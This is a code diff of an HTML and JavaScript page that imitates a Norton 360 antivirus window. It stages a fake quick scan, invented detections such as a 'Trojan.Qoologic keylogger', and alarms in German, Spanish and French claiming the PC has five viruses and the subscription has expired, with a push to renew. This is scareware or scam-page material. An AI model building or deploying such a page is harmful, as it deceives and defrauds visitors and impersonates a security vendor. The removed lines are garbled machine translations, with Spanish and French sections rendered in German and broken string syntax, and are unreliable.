 
-<img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
+        <div class="txt1" id="w4_2a"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Hohes Risiko </font></font></div>
 
-<div class="txt3">
+        <img src="5f205bc2379ac_v.gif" class="ico_tray2">
 
-<span id="w4_6a"><b>Aktivität</b></span><br/>
+        <div class="txt2">
 
-<span id="w4_7a">
-Bedrohungsaktionen Erfasst: 1</span>
+            <span id="w4_4a"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Original </font></font></b></span><br>
 
-</div>
+            <span id="w4_5a"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Nicht verfügbar </font></font></span>
 
-</div>
+        </div>
 
-</div>
+        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3">
 
-<div id="vir3">
+        <div class="txt3">
 
-<div id="vir_tray">
+            <span id="w4_6a"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Aktivität </font></font></b></span><br>
 
-<div class="line_red">
+            <span id="w4_7a"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+Bedrohungsmaßnahmen ergriffen: 1 </font></font></span>
 
-<span id="w4_1b"><b>Bedrohung gefunden!</b></span><br/>
+        </div>
 
-Adware.Win32.Look2me.ab
-
-</div>
-
-<img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
-
-<div class="txt1" id="w4_3">Mittleres Risiko</div>
-
-<img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
-
-<div class="txt2">
-
-<span id="w4_4b"><b>Original</b></span><br/>
-
-<span id="w4_5b">Nicht verfügbar</span>
+    </div>
 
 </div>
 
-<img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
+<div id="vir3" style="bottom: 440px; opacity: 0;">
 
-<div class="txt3">
+    <div id="vir_tray">
 
-<span id="w4_6b"><b>Aktivität</b></span><br/>
+        <div class="line_red">
 
-<span id="w4_7b">Ergriffene Bedrohungsaktionen: 1</span>
+            <span id="w4_1b"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Entdecken Sie die Bedrohung! </font></font></b></span><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 
-</div>
+            Adware.Win32. Look2me.ab
 
-</div>
+        </font></font></div>
 
-</div>
+        <img src="5f205bc1a74d5_v.gif" class="ico_tray1">
 
-<div id="vir4">
+        <div class="txt1" id="w4_3"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Mittleres Risiko </font></font></div>
 
-<div id="vir_tray">
+        <img src="5f205bc2379ac_v.gif" class="ico_tray2">
 
-<div class="line_red">
+        <div class="txt2">
 
-<span id="w4_1c"><b>Bedrohung gefunden!</b></span><br/>
+            <span id="w4_4b"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Original </font></font></b></span><br>
 
-Trojan.Qoologic – Keylogger
+            <span id="w4_5b"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Nicht verfügbar </font></font></span>
 
-</div>
+        </div>
 
-<img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
+        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3">
 
-<div class="txt1" id="w4_2b">Hohes Risiko</div>
+        <div class="txt3">
 
-<img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
+            <span id="w4_6b"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Aktivität </font></font></b></span><br>
 
-<div class="txt2">
+            <span id="w4_7b"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Bedrohungsmaßnahmen ergriffen: 1 </font></font></span>
 
-<span id="w4_4c"><b>Original</b></span><br/>
+        </div>
 
-<span id="w4_5c">Nicht verfügbar
-Ja</span>
-
-</div>
-
-<img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
-
-<div class="txt3">
-
-<span id="w4_6c"><b>Aktivität</b></span><br/>
-
-<span id="w4_7c">Ergriffene Bedrohungsmaßnahmen: 1</span>
+    </div>
 
 </div>
 
+<div id="vir4" style="bottom: 440px; opacity: 0;">
+
+    <div id="vir_tray">
+
+        <div class="line_red">
+
+            <span id="w4_1c"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Entdecken Sie die Bedrohung! </font></font></b></span><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+
+           Trojan.Qoologic-Keylogger
+
+        </font></font></div>
+
+        <img src="5f205bc1a74d5_v.gif" class="ico_tray1">
+
+        <div class="txt1" id="w4_2b"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Hohes Risiko </font></font></div>
+
+        <img src="5f205bc2379ac_v.gif" class="ico_tray2">
+
+        <div class="txt2">
+
+            <span id="w4_4c"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Original </font></font></b></span><br>
+
+            <span id="w4_5c"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Nicht verfügbar </font></font></span>
+
+        </div>
+
+        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3">
+
+        <div class="txt3">
+
+            <span id="w4_6c"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Aktivität </font></font></b></span><br>
+
+            <span id="w4_7c"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Bedrohungsmaßnahmen ergriffen: 1 </font></font></span>
+
+        </div>
+
+    </div>
+
 </div>
 
-<div id="vir5">
+<div id="vir5" style="bottom: 235px; opacity: 0;">
 
-<div id="vir_tray">
+    <div id="vir_tray">
 
-<div class="line_red">
+        <div class="line_red">
 
-<span id="w4_1d"><b>Bedrohung gefunden!</b></span><br/>
+            <span id="w4_1d"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Entdecken Sie die Bedrohung! </font></font></b></span><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 
-Trojan.Fakealert.356
+            Trojan.Fakealert.356
 
-</div>
+        </font></font></div>
 
-<img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
+        <img src="5f205bc1a74d5_v.gif" class="ico_tray1">
 
-<div class="txt1" id="w4_2c">Hohes Risiko</div>
+        <div class="txt1" id="w4_2c"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Hohes Risiko </font></font></div>
 
-<img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
+        <img src="5f205bc2379ac_v.gif" class="ico_tray2">
 
-<div class="txt2">
+        <div class="txt2">
 
-<span id="w4_4d"><b>Original</b></span><br/>
+            <span id="w4_4d"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Original </font></font></b></span><br>
 
-<span id="w4_5d">Nicht verfügbar</span>
+            <span id="w4_5d"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Nicht verfügbar </font></font></span>
 
-</div>
+        </div>
 
-<img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
+        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3">
 
-<div class="txt3">
+        <div class="txt3">
 
-<span id="w4_6d"><b>Aktivität</b></span><br/>
+            <span id="w4_6d"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Aktivität </font></font></b></span><br>
 
-<span id="w4_7d">Ergriffene Bedrohungsmaßnahmen: 1</span>
+            <span id="w4_7d"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Bedrohungsmaßnahmen ergriffen: 1 </font></font></span>
 
-</div>
+        </div>
 
-</div>
+    </div>
 
 </div>
 
 <script language="JavaScript" type="text/javascript">
 
-var lang = window.navigator.sprache || navigator.userLanguage;
+    var lang = window.navigator.language || navigator.userLanguage;
 
-lang = lang.substr(0, 2).toLowerCase();
+    lang = lang.substr(0, 2).toLowerCase();
 
-if (lang == "de") {
+    if (lang == "de") {
 
-document.getElementById("menu").innerHTML = "PRODUKTE & DIENSTLEISTUNGEN &nbsp&nbsp&nbsp INTERNET SECURITY CENTER &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp KOSTENLOSE TESTVERSIONEN";
+        document.getElementById("menu").innerHTML = "PRODUKTE & SERVICES &nbsp&nbsp&nbsp INTERNET SECURITY CENTER &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp KOSTENLOSE TESTVERSIONEN";
 
-document.getElementById("menu_b").innerHTML = "Rechtliche | Hinweise | Lizenzvereinbarung | Datenschutz | Jobs und Karriere | Cookies | Wegweiser | Systemstatus";
+        document.getElementById("menu_b").innerHTML = "Rechtliche | Hinweise | Lizenzvereinbarung | Datenschutz | Jobs und Karriere | Cookies | Wegweiser | Systemstatus";
 
-document.getElementById("head1").innerHTML = "Online-Bedrohungen haben sich weiterentwickelt. Unser Schutz auch.";
+        document.getElementById("head1").innerHTML = "Online-Bedrohungen haben sich weiterentwickelt. Unser Schutz auch.";
 
-document.getElementById("head2").innerHTML = "Darum bietet Norton 360 mehrere Schutzebenen in einer einzigen Lösung: Gerätesicherheit, Secure VPN, Passwort-Manager und mehr.";
+        document.getElementById("head2").innerHTML = "Darum bietet Norton 360 mehrere Schutzebenen in einer einzigen Lösung: Gerätesicherheit, Secure VPN, Passwort-Manager und mehr.";
 
-}
+    }
 
 
 
-if (lang == "es") {
+    if (lang == "es") {
 
-document.getElementById("menu").innerHTML = "PRODUKTE UND DIENSTLEISTUNGEN &nbsp&nbsp&nbsp ASISTENCIA &nbsp&nbsp&nbsp PRÜFVERSIONEN";
+        document.getElementById("menu").innerHTML = "PRODUCTOS Y SERVICIOS &nbsp&nbsp&nbsp ASISTENCIA &nbsp&nbsp&nbsp VERSIONES DE PRUEBA";
 
-document.getElementById("menu_b").innerHTML = "Rechtliche Hinweise | Lizenzrecht | Datenschutzrichtlinien | Freie Stellen | Cookies | Standortkarte | Systemstatus";
+        document.getElementById("menu_b").innerHTML = "Aviso legal | Acuerdo de licencia | Política de privacidad | Vacantes | Cookies | Mapa del sitio | Estado del sistema";
 
-document.getElementById("head1").innerHTML = "Die Dateien wurden weiterentwickelt. Auch hier gibt es unseren Schutz.";
+        document.getElementById("head1").innerHTML = "Las ciberamenazas han evolucionado. También lo ha hecho nuestra protección.";
 
-document.getElementById("head2").innerHTML = "Norton 360.
+        document.getElementById("head2").innerHTML = "Norton 360. Protección completa con Seguridad del dispositivo que incluye antivirus, VPN, Gestor de contraseñas y mucho más. Todo en una única solución.";
 
-document.getElementById("w1_ico1").style.right = "127px";
+        document.getElementById("w1_ico1").style.right = "127px";
 
-document.getElementById("w1_1").style.right = "85px";
+        document.getElementById("w1_1").style.right = "85px";
 
-document.getElementById("w1_ico2").style.right = "57px";
+        document.getElementById("w1_ico2").style.right = "57px";
 
-document.getElementById("w1_1").innerHTML = "Anpassungen";
+        document.getElementById("w1_1").innerHTML = "Ajustes";
 
-document.getElementById("w1_2").innerHTML = "Hilfe";
+        document.getElementById("w1_2").innerHTML = "Ayuda";
 
-document.getElementById("w1_3").innerHTML = "Geschützt";
+        document.getElementById("w1_3").innerHTML = "Está protegido";
 
-document.getElementById("w1_4").innerHTML = "Sicherheitsaktualisierungen:";
+        document.getElementById("w1_4").innerHTML = "Actualizaciones de protección: ";
 
-document.getElementById("w1_5").innerHTML = "Aktuell";
+        document.getElementById("w1_5").innerHTML = "Actual";
 
-document.getElementById("w1_6").innerHTML = "Letzter Scan:";
+        document.getElementById("w1_6").innerHTML = "Último escaneo: ";
 
-document.getElementById("w1_7").innerHTML = "Nicht verfügbar";
+        document.getElementById("w1_7").innerHTML = "No está disponible";
 
-document.getElementById("w1_8").innerHTML = "| Schneller Scan";
+        document.getElementById("w1_8").innerHTML = "| Escaneo rápido";
 
-document.getElementById("w1_9").innerHTML = "Verwendete Lizenzen:";
+        document.getElementById("w1_9").innerHTML = "Licencias utilizadas: ";
 
-document.getElementById("w1_10").innerHTML = "1 von 5";
+        document.getElementById("w1_10").innerHTML = "1 de 5";
 
-document.getElementById("w1_11").innerHTML = "| Auf einem anderen Gerät installieren“;
+        document.getElementById("w1_11").innerHTML = "| Instalar en otro dispositivo";
 
-document.getElementById("w1_12").innerHTML = "Sicherheit";
+        document.getElementById("w1_12").innerHTML = "Seguridad";
 
-document.getElementById("w1_13").innerHTML = "Protegido";
+        document.getElementById("w1_13").innerHTML = "Protegido";
 
-document.getElementById("w1_14").innerHTML = "Identität";        document.getElementById("w1_13a").innerHTML = "Protegido";
+        document.getElementById("w1_14").innerHTML = "Identidad";
 
-document.getElementById("w1_15").innerHTML = "Desempeño";
+        document.getElementById("w1_13a").innerHTML = "Protegido";
 
-document.getElementById("w1_13b").innerHTML = "Protegido";
+        document.getElementById("w1_15").innerHTML = "Desempeño";
 
-document.getElementById("w1_16").innerHTML = "Mehr Norton";
+        document.getElementById("w1_13b").innerHTML = "Protegido";
 
-document.getElementById("w1_13c").innerHTML = „Protegido“;
+        document.getElementById("w1_16").innerHTML = "Más Norton";
 
-document.getElementById("w1_17").innerHTML = "ABONNIEREN: ";
+        document.getElementById("w1_13c").innerHTML = "Protegido";
 
-document.getElementById("w1_18").innerHTML = "30 Tage ruhend";
+        document.getElementById("w1_17").innerHTML = "ESTADO DE LA SUSCRIPCIÓN: ";
 
-document.getElementById("w2_1").innerHTML = "Schnell scannen";
+        document.getElementById("w1_18").innerHTML = "30 días restantes";
 
-document.getElementById("w2_2").innerHTML = "Trabajando";
+        document.getElementById("w2_1").innerHTML = "Escaneo rápido";
 
-document.getElementById("w2_3").innerHTML = "Infiziert und ursprüngliche Archive...";
+        document.getElementById("w2_2").innerHTML = "Trabajando";
 
-document.getElementById("w2_4").innerHTML = "Trabajando";
+        document.getElementById("w2_3").innerHTML = "Escaneando las áreas comúnmente infectadas y los archivos de inicio...";
 
-document.getElementById("w2_5").innerHTML = "Infiziert und archiviert von Anfang...";
+        document.getElementById("w2_4").innerHTML = "Trabajando";
 
-document.getElementById("w2_6").innerHTML = "Resumen de results";
+        document.getElementById("w2_5").innerHTML = "Escaneando las áreas comúnmente infectadas y los archivos de inicio...";
 
-document.getElementById("w2_7").innerHTML = "[+] Gesamtzahl der gescannten Artikel:";
+        document.getElementById("w2_6").innerHTML = "Resumen de resultados";
 
-document.getElementById("w2_8").innerHTML = "[+] Gesamtzahl der erkannten Sicherheitsrisiken:";
+        document.getElementById("w2_7").innerHTML = "[+] Total de artículos escaneados:";
 
-document.getElementById("w2_9").in
-nerHTML = "[+] Sicherheitsrisiken insgesamt behoben:";
+        document.getElementById("w2_8").innerHTML = "[+] Total de riesgos de seguridad detectados:";
 
-document.getElementById("w2_10").innerHTML = "Sicherheitsrisiken insgesamt, die Aufmerksamkeit erfordern:";
+        document.getElementById("w2_9").innerHTML = "[+] Total de riesgos de seguridad resueltos:";
 
-document.getElementById("w2_11").innerHTML = "Pause";
+        document.getElementById("w2_10").innerHTML = "Total de riesgos de seguridad que requieren atención:";
 
-document.getElementById("w2_12").innerHTML = "Stopp";
+        document.getElementById("w2_11").innerHTML = "Pausa";
 
-document.getElementById("w3_1").innerHTML = "Ihr PC ist mit 5 Viren infiziert!";
+        document.getElementById("w2_12").innerHTML = "Detener";
 
-document.getElementById("w3_2").innerHTML = "AKTION ERFORDERLICH!";
+        document.getElementById("w3_1").innerHTML = "¡Su PC está infectado con 5 virus!";
 
-document.getElementById("w3_3").innerHTML = "Ihr Norton-Abonnement ist abgelaufen!";
+        document.getElementById("w3_2").innerHTML = "¡SE REQUIERE LLEVAR A CABO UNA ACCIÓN!";
 
-document.getElementById("w3_4").innerHTML = "Jetzt verlängern, um Ihren PC zu schützen.";
+        document.getElementById("w3_3").innerHTML = "¡Su suscripción a Norton ha expirado!";
 
-document.getElementById("w3_5").innerHTML = "Wenn Ihr PC ungeschützt ist, besteht das Risiko von Viren und anderer Malware.";
+        document.getElementById("w3_4").innerHTML = "Renuévela ahora para mantener su PC protegida.";
 
-document.getElementById("w3_6").innerHTML = "Weiter...";
+        document.getElementById("w3_5").innerHTML = "Si su PC está desprotegida, corre el riesgo de sufrir ataques de virus y otros tipos de malware.";
 
-document.getElementById("w4_1").innerHTML = "Eine Bedrohung wurde erkannt!";
+        document.getElementById("w3_6").innerHTML = "Continuar...";
 
-document.getElementById("w4_1a").innerHTML = "Eine Bedrohung wurde erkannt!";
+        document.getElementById("w4_1").innerHTML = "¡Se detectó una amenaza!";
 
-document.getElementById("w4_1b").innerHTML = "Eine Bedrohung wurde erkannt!";
+        document.getElementById("w4_1a").innerHTML = "¡Se detectó una amenaza!";
 
-document.getElementById("w4_1d").innerHTML = "Eine Bedrohung wurde erkannt!";
+        document.getElementById("w4_1b").innerHTML = "¡Se detectó una amenaza!";
 
-document.getElementById("w4_2").innerHTML = "Hohes Risiko";
+        document.getElementById("w4_1c").innerHTML = "¡Se detectó una amenaza!";
 
-document.getElementById("w4_2a").innerHTML = "Hohes Risiko";
+        document.getElementById("w4_1d").innerHTML = "¡Se detectó una amenaza!";
 
-document.getElementById("w4_2b").innerHTML = "Hohes Risiko";
+        document.getElementById("w4_2").innerHTML = "Alto riesgo";
 
-document.getElementById("w4_2c").innerHTML = "Hohes Risiko";
+        document.getElementById("w4_2a").innerHTML = "Alto riesgo";
 
-document.getElementById("w4_3").innerHTML = "Mittleres Risiko";
+        document.getElementById("w4_2b").innerHTML = "Alto riesgo";
 
-document.getElementById("w4_4").innerHTML = "Source";
+        document.getElementById("w4_2c").innerHTML = "Alto riesgo";
 
-document.getElementById("w4_4b").innerHTML = "Source";
+        document.getElementById("w4_3").innerHTML = "Riesgo medio";
 
-document.getElementById("w4_4c").innerHTML = "Source";
+        document.getElementById("w4_4").innerHTML = "Origen";
 
-document.getElementById("w4_4d").innerHTML = "Source";
+        document.getElementById("w4_4a").innerHTML = "Origen";
 
-document.getElementById("w4_5").innerHTML = "Nicht verfügbar.";
+        document.getElementById("w4_4b").innerHTML = "Origen";
 
-document.getElementById("w4_5a").innerHTML = "Nicht verfügbar.";
+        document.getElementById("w4_4c").innerHTML = "Origen";
 
-document.getElementById("w4_5b").innerHTML = "Nicht verfügbar.";
+        document.getElementById("w4_4d").innerHTML = "Origen";
 
-document.getElementById("w4_5c").innerHTML = "Nicht verfügbar.";
+        document.getElementById("w4_5").innerHTML = "No está disponible.";
 
-document.getElementById("w4_6").innerHTML = "Aktivität";
+        document.getElementById("w4_5a").innerHTML = "No está disponible.";
 
-document.getElementById("w4_6a").innerHTML = "Aktivität";
+        document.getElementById("w4_5b").innerHTML = "No está disponible.";
 
-document.getElementById("w4_6b").innerHTML = "Aktivität";
+        document.getElementById("w4_5c").innerHTML = "No está disponible.";
 
-document.getElementById("w4_6c").innerHTML = "Aktivität";
+        document.getElementById("w4_5d").innerHTML = "No está disponible.";
 
-document.getElementById("w4_6d").innerHTML = "Aktivität";
+        document.getElementById("w4_6").innerHTML = "Actividad";
 
-document.getElementById("w4_7").innerHTML = "Gegen die Bedrohung ergriffene Maßnahmen: 1";
+        document.getElementById("w4_6a").innerHTML = "Actividad";
 
-document.getElementById("w4_7b").innerHTML = "Gegen die Bedrohung ergriffene Maßnahmen: 1";
+        document.getElementById("w4_6b").innerHTML = "Actividad";
 
-document.getElementById("w4_7c").innerHTML = "Gegen die Bedrohung ergriffene Maßnahmen: 1";
+        document.getElementById("w4_6c").innerHTML = "Actividad";
 
-document.getElementById("w4_7d").innerHTML = "Gegen die Bedrohung ergriffene Maßnahmen: 1";
+        document.getElementById("w4_6d").innerHTML = "Actividad";
 
-}
+        document.getElementById("w4_7").innerHTML = "Acciones realizadas contra la amenaza: 1";
 
-if (lang == "fr") {
+        document.getElementById("w4_7a").innerHTML = "Acciones realizadas contra la amenaza: 1";
 
-document.getElementById("menu").innerHTML = "PRODUKTE UND DIENSTLEISTUNGEN INTERNET-SICHERHEITSZENTRUM SUPPORT KOSTENLOSE BEWERTUNGEN";
+        document.getElementById("w4_7b").innerHTML = "Acciones realizadas contra la amenaza: 1";
 
-document.getElementById("menu_b").innerHTML = "Rechtliche Hinweise | Lizenzvertrag | Vertraulichkeitspolitik | Träger | Cookies | Website-Plan | Systemstatus"; 
+        document.getElementById("w4_7c").innerHTML = "Acciones realizadas contra la amenaza: 1";
 
-document.getElementById("head1").innerHTML = "Die Cyberbedrohungen haben sich weiterentwickelt. Kein Schutz mehr."; 
+        document.getElementById("w4_7d").innerHTML = "Acciones realizadas contra la amenaza: 1";
 
-document.getElementById("head2").innerHTML = "Das ist Norton 360, das zusätzliche Schutzebenen in einer Einzel- und Einzellösung bietet: Appliance-Sicherheit, sicheres VPN, Passwort-Manager und mehr."; 
+    }
 
-document.getElementById("w1_ico1").style.right = "172px"; 
 
-document.getElementById("w1_1").style.right = "110px"; 
 
-document.getElementById("w1_ico2").style.right = "79px"; 
+    if (lang == "fr") {
 
-document.getElementById("w1_1").innerHTML = "Parameters"; 
+        document.getElementById("menu").innerHTML = "PRODUITS ET SERVICES &nbsp&nbsp&nbsp CENTRE DE SÉCURITÉ INTERNET &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp ÉVALUATIONS GRATUITES";
 
-document.getElementById("w1_2").innerHTML = "Assistance"; 
+        document.getElementById("menu_b").innerHTML = "Mentions légales | Contrat de licence | Politique de confidentialité | Carrières | Cookies | Plan du site | État du système";
 
-document.getElementById("w1_3").innerHTML = "Sie sind geschützt"; 
+        document.getElementById("head1").innerHTML = "Les cybermenaces ont évolué. Notre protection aussi.";
 
-document.getElementById("w1_4").innerHTML = "Neue Informationen zum Schutz: "; 
+        document.getElementById("head2").innerHTML = "C'est pourquoi Norton 360 offre plusieurs niveaux de protection dans une seule et même solution : sécurité de l'appareil, Secure VPN, Password Manager et plus.";
 
-document.getElementById("w1_5").innerHTML = "Actuelle"; 
+        document.getElementById("w1_ico1").style.right = "172px";
 
-document.getElementById("w1_6").innerHTML = "Dernier scan : "; 
+        document.getElementById("w1_1").style.right = "110px";
 
-document.getElementById("w1_7").innerHTML = "Nicht verfügbar"; 
+        document.getElementById("w1_ico2").style.right = "79px";
 
-document.getElementById("w1_8").innerHTML = "| Schnell scannen"; 
+        document.getElementById("w1_1").innerHTML = "Paramètres";
 
-document.getElementById("w1_9").innerHTML = "Lizenzen während der Nutzung:"; 
+        document.getElementById("w1_2").innerHTML = "Assistance";
 
-document.getElementById("w1_10").innerHTML = "1 von 5"; 
+        document.getElementById("w1_3").innerHTML = "Vous êtes protégé·e";
 
-document.getElementById("w1_11").innerHTML = "| Installer auf einem anderen Gerät"; 
+        document.getElementById("w1_4").innerHTML = "Dernières nouvelles concernant la protection : ";
 
-document.getElementById("w1_12").innerHTML = "Ich weiß
-Sicherheit";
+        document.getElementById("w1_5").innerHTML = "Actuelle";
 
-document.getElementById("w1_13").innerHTML = "Geschützt";
+        document.getElementById("w1_6").innerHTML = "Dernier scan : ";
 
-document.getElementById("w1_14").innerHTML = "Identität";
+        document.getElementById("w1_7").innerHTML = "Non disponible";
 
-document.getElementById("w1_13a").innerHTML = "Geschützt";
+        document.getElementById("w1_8").innerHTML = "| Scan rapide";
 
-document.getElementById("w1_15").innerHTML = "Leistung";
+        document.getElementById("w1_9").innerHTML = "Licences en cours d'utilisation : ";
 
-document.getElementById("w1_13b").innerHTML = "Geschützt";
+        document.getElementById("w1_10").innerHTML = "1 sur 5";
 
-document.getElementById("w1_16").innerHTML = "Weitere Norton-Produkte";
+        document.getElementById("w1_11").innerHTML = "| Installer sur un autre appareil";
 
-document.getElementById("w1_13c").innerHTML = "Geschützt";
+        document.getElementById("w1_12").innerHTML = "Sécurité";
 
-document.getElementById("w1_17").innerHTML = "ABONNEMENT STATUS: ";
+        document.getElementById("w1_13").innerHTML = "Protégé·e";
 
-document.getElementById("w1_18").innerHTML = "Noch 30 Tage";
+        document.getElementById("w1_14").innerHTML = "Identité";
 
-document.getElementById("w2_1").innerHTML = "Schnellscan";
+        document.getElementById("w1_13a").innerHTML = "Protégé·e";
 
-document.getElementById("w2_2").innerHTML = "In Bearbeitung";
+        document.getElementById("w1_15").innerHTML = "Performance";
 
-document.getElementById("w2_3").innerHTML = "Häufig infizierte Bereiche und Startdateien werden gescannt...";
+        document.getElementById("w1_13b").innerHTML = "Protégé·e";
 
-document.getElementById("w2_4").innerHTML = "In Bearbeitung";
+        document.getElementById("w1_16").innerHTML = "Plus de produits Norton";
 
-document.getElementById("w2_5").innerHTML = "Häufig infizierte Bereiche und Startdateien werden gescannt...";
+        document.getElementById("w1_13c").innerHTML = "Protégé·e";
 
-document.getElementById("w2_6").innerHTML = "Ergebnisse Zusammenfassung";
+        document.getElementById("w1_17").innerHTML = "ÉTAT DE L'ABONNEMENT : ";
 
-document.getElementById("w2_7").innerHTML = "[+] Gesamtzahl der gescannten Objekte:";
+        document.getElementById("w1_18").innerHTML = "30 jours restants";
 
-document.getElementById("w2_8").innerHTML = "[+] Gesamtzahl der erkannten Sicherheitsrisiken:";
+        document.getElementById("w2_1").innerHTML = "Scan rapide";
 
-document.getElementById("w2_9").innerHTML = "[+] Gesamtzahl der behobenen Sicherheitsrisiken:";
+        document.getElementById("w2_2").innerHTML = "En cours";
 
-document.getElementById("w2_10").innerHTML = "Gesamtanzahl der Sicherheitsrisiken, die behoben werden müssen:";
+        document.getElementById("w2_3").innerHTML = "Scan des zones communément infectées et des fichiers de démarrage...";
 
-document.getElementById("w2_11").innerHTML = "Pause";
+        document.getElementById("w2_4").innerHTML = "En cours";
 
-document.getElementById("w2_12").innerHTML = "Stopp";
+        document.getElementById("w2_5").innerHTML = "Scan des zones communément infectées et des fichiers de démarrage...";
 
-document.getElementById("w3_1").innerHTML = "Ihr PC ist mit 5 infiziert Viren!";
+        document.getElementById("w2_6").innerHTML = "Résumé des résultats";
 
-document.getElementById("w3_2").innerHTML = "MASSNAHMEN ERFORDERLICH!";
+        document.getElementById("w2_7").innerHTML = "[+] Nombre total d'objets scannés :";
 
-document.getElementById("w3_3").innerHTML = "Ihr Norton-Abonnement ist abgelaufen!";
+        document.getElementById("w2_8").innerHTML = "[+] Nombre total de risques pour la sécurité détectés :";
 
-document.getElementById("w3_4").innerHTML = "Verlängern Sie es jetzt, um Ihren PC zu schützen.";
+        document.getElementById("w2_9").innerHTML = "[+] Nombre total de risques pour la sécurité résolus :";
 
-document.getElementById("w3_5").innerHTML = "Wenn Ihr PC nicht geschützt ist, besteht das Risiko einer Infektion mit Viren und anderer Malware.";
+        document.getElementById("w2_10").innerHTML = "Nombre total de risques à la sécurité requérant de l'attention :";
 
-document.getElementById("w3_6").innerHTML = "Weiter...";
+        document.getElementById("w2_11").innerHTML = "Pause";
 
-document.getElementById("w4_1").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w2_12").innerHTML = "Stop";
 
-document.getElementById("w4_1a").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w3_1").innerHTML = "Votre PC est infecté par 5 virus !";
 
-document.getElementById("w4_1b").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w3_2").innerHTML = "DES MESURES DOIVENT ÊTRE PRISES !";
 
-document.getElementById("w4_1c").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w3_3").innerHTML = "Votre abonnement à Norton a expiré !";
 
-document.getElementById("w4_1d").innerHTML = "Bedrohung erkannt!";
+        document.getElementById("w3_4").innerHTML = "Renouvelez-le dès maintenant pour maintenir la protection de votre PC.";
 
-document.getElementById("w4_2").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_5").innerHTML = "Si votre PC n'est pas protégé, il existe un risque d'infection par des virus et autres maliciels.";
 
-document.getElementById("w4_2a").innerHTML = "Hohes Risiko";
+        document.getElementById("w3_6").innerHTML = "Continuer...";
 
-document.getElementById("w4_2b").innerHTML = "Hohes Risiko";
+        document.getElementById("w4_1").innerHTML = "Menace détectée !";
 
-document.getElementById("w4_2c").innerHTML = "Hohes Risiko";
+        document.getElementById("w4_1a").innerHTML = "Menace détectée !";
 
-document.getElementById("w4_3").innerHTML = "Mittleres Risiko";
+        document.getElementById("w4_1b").innerHTML = "Menace détectée !";
 
-document.getElementById("w4_4").innerHTML = "Ursprung";
+        document.getElementById("w4_1c").innerHTML = "Menace détectée !";
 
-document.getElementById("w4_4a").innerHTML = "Ursprung";
+        document.getElementById("w4_1d").innerHTML = "Menace détectée !";
 
-document.getElementById("w4_4b").innerHTML = "Ursprung";
+        document.getElementById("w4_2").innerHTML = "Haut risque";
 
-document.getElementById("w4_4c").innerHTML = "Ursprung";
+        document.getElementById("w4_2a").innerHTML = "Haut risque";
 
-document.getElementById("w4_4d").innerHTML = "Ursprung";
+        document.getElementById("w4_2b").innerHTML = "Haut risque";
 
-document.getElementById("w4_5").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_2c").innerHTML = "Haut risque";
 
-document.getElementById("w4_5a").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_3").innerHTML = "Risque moyen";
 
-document.getElementById("w4_5b").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_4").innerHTML = "Origine";
 
-document.getElementById("w4_5c").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_4a").innerHTML = "Origine";
 
-document.getElementById("w4_5d").innerHTML = "Nicht verfügbar";
+        document.getElementById("w4_4b").innerHTML = "Origine";
 
-document.getElementById("w4_6").innerHTML = "Aktivität";
+        document.getElementById("w4_4c").innerHTML = "Origine";
 
-document.getElementById("w4_6a").innerHTML = "Aktivität";
+        document.getElementById("w4_4d").innerHTML = "Origine";
 
-document.getElementById("w4_6b").innerHTML = "Aktivität";
+        document.getElementById("w4_5").innerHTML = "Non disponible";
 
-document.getElementById("w4_6c").innerHTML = "Aktivität";
+        document.getElementById("w4_5a").innerHTML = "Non disponible";
 
-document.getElementById("w4_6d").innerHTML = "Aktivität";
+        document.getElementById("w4_5b").innerHTML = "Non disponible";
 
-document.getElementById("w4_7").innerHTML = "Durchgeführte Maßnahmen zur Bedrohungsabwehr: 1";
